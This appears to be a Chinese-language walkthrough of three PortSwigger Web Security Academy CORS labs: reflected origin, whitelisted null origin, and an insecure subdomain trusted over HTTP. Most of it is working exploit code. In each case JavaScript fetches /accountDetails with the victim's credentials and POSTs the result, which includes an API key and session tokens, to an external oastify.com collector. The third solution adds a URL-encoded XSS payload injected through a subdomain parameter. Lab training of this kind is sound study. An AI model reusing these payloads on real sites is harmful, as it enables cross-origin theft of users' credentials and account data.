## 因 CORS 配置问题产生的漏洞

### 服务器生成的 ACAO 头来自客户端指定的 Origin 头

实验：基于基本来源反射的 CORS 漏洞
https://portswigger.net/web-security/cors/lab-basic-origin-reflection-attack

登陆后的响应为
Set-Cookie: session=Iu8isedz6SZyEmctccKCx4JW5K1Rx6x0; Secure; HttpOnly; SameSite=None
解除 SameSite 限制

在账号主页
GET /my-account?id=wiener HTTP/2

响应显示api key
```html
<div id=account-content>
    <p>Your username is: wiener</p>
    <div>Your API Key is: <span id=apikey></span></div>

<script>
    fetch('/accountDetails', {credentials:'include'})
        .then(r => r.json())
        .then(j => document.getElementById('apikey').innerText = j.apikey)
</script>
```

GET /accountDetails HTTP/2

HTTP/2 200 OK
Access-Control-Allow-Credentials: true
```json
{
  "username": "wiener",
  "email": "",
  "apikey": "VS28z8mOd3MIvJglmz3Q6uEoDsBZNv0t",
  "sessions": [
    "TZECy6AbVcJMKx0T0xBTccDqeNQjwe9h"
  ]
}
```

添加Origin头部后
Origin: exploit-0a9f00910365e1c280360c6b012100ca.exploit-server.net
响应为
HTTP/2 200 OK
Access-Control-Allow-Origin: https://exploit-0a9f00910365e1c280360c6b012100ca.exploit-server.net
Access-Control-Allow-Credentials: true
服务器反映了任意来源

在控制页面设置
```html
<script>
    // 如使用 Fetch 也需设置 credentials: 'include' 实现凭证携带
    var req = new XMLHttpRequest();
    req.onload = reqListener;
    req.open('get','https://0a43005403b3e1eb80240d74003d00d8.web-security-academy.net/accountDetails',true);
    req.withCredentials = true;
    req.send();

    function reqListener() {
        // 两种方法 url传递或post传递
        // location='//cdtddv7nqf1317mdyzt5lnauyl4cs4gt.oastify.com/log?key='+this.responseText;
        fetch('https://cdtddv7nqf1317mdyzt5lnauyl4cs4gt.oastify.com', {
            method: 'POST',
            body: this.responseText
            });
    };
</script>
```

### 允许的 null 原始值

实验：受信任的空原点的 CORS 漏洞
https://portswigger.net/web-security/cors/lab-null-origin-whitelisted-attack


```html
<!-- 使用iframe 沙盒，生成 null 来源请求 -->
<iframe sandbox="allow-scripts allow-top-navigation allow-forms" src="data:text/html,<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0aee00d604df7ddd816f112400d400e4.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
fetch('https://h8q7rx4blaiy4xodhuiw3qciu900oucj.oastify.com', {
method: 'POST',
body: this.responseText
});
};
</script>"></iframe>
```

### 破坏 TLS 配置不当的 CORS

https://portswigger.net/web-security/cors/lab-breaking-https-attack
实验：使用受信任的不安全协议的 CORS 漏洞

检查库存的表单脚本为
```html
<script>
    const stockCheckForm = document.getElementById("stockCheckForm");
    stockCheckForm.addEventListener("submit", function(e) {
        const data = new FormData(stockCheckForm);
        window.open('http://stock.0a01001a04a53d708097cc2100d20048.web-security-academy.net/?productId=1&storeId=' + data.get('storeId'), 'stock', 'height=10,width=10,left=10,top=10,menubar=no,toolbar=no,location=no,status=no');
        e.preventDefault();
    });
</script>
```

示例解决方案：
注入点在 stock子域名的 productId参数值中
```html
<!-- 将获取数据的脚本注入stock子域名的参数中 -->
<script>
var req = new XMLHttpRequest();
req.onload = reqListener;
req.open('get','https://0a01001a04a53d708097cc2100d20048.web-security-academy.net/accountDetails',true);
req.withCredentials = true;
req.send();
function reqListener() {
fetch('https://urpkaano4n1bna7q0719m3vvdmjd74vt.oastify.com', {
method: 'POST',
body: this.responseText
});
};
</script>

<!-- 构建stock子域名的XSS注入url -->
<script>
    location = 'http://stock.0a01001a04a53d708097cc2100d20048.web-security-academy.net/?productId=%3c%73%63%72%69%70%74%3e%0a%76%61%72%20%72%65%71%20%3d%20%6e%65%77%20%58%4d%4c%48%74%74%70%52%65%71%75%65%73%74%28%29%3b%0a%72%65%71%2e%6f%6e%6c%6f%61%64%20%3d%20%72%65%71%4c%69%73%74%65%6e%65%72%3b%0a%72%65%71%2e%6f%70%65%6e%28%27%67%65%74%27%2c%27%68%74%74%70%73%3a%2f%2f%30%61%30%31%30%30%31%61%30%34%61%35%33%64%37%30%38%30%39%37%63%63%32%31%30%30%64%32%30%30%34%38%2e%77%65%62%2d%73%65%63%75%72%69%74%79%2d%61%63%61%64%65%6d%79%2e%6e%65%74%2f%61%63%63%6f%75%6e%74%44%65%74%61%69%6c%73%27%2c%74%72%75%65%29%3b%0a%72%65%71%2e%77%69%74%68%43%72%65%64%65%6e%74%69%61%6c%73%20%3d%20%74%72%75%65%3b%0a%72%65%71%2e%73%65%6e%64%28%29%3b%0a%66%75%6e%63%74%69%6f%6e%20%72%65%71%4c%69%73%74%65%6e%65%72%28%29%20%7b%0a%66%65%74%63%68%28%27%68%74%74%70%73%3a%2f%2f%75%72%70%6b%61%61%6e%6f%34%6e%31%62%6e%61%37%71%30%37%31%39%6d%33%76%76%64%6d%6a%64%37%34%76%74%2e%6f%61%73%74%69%66%79%2e%63%6f%6d%27%2c%20%7b%0a%6d%65%74%68%6f%64%3a%20%27%50%4f%53%54%27%2c%0a%62%6f%64%79%3a%20%74%68%69%73%2e%72%65%73%70%6f%6e%73%65%54%65%78%74%0a%7d%29%3b%0a%7d%3b%0a%3c%2f%73%63%72%69%70%74%3e&storeId=1';
</script>
```


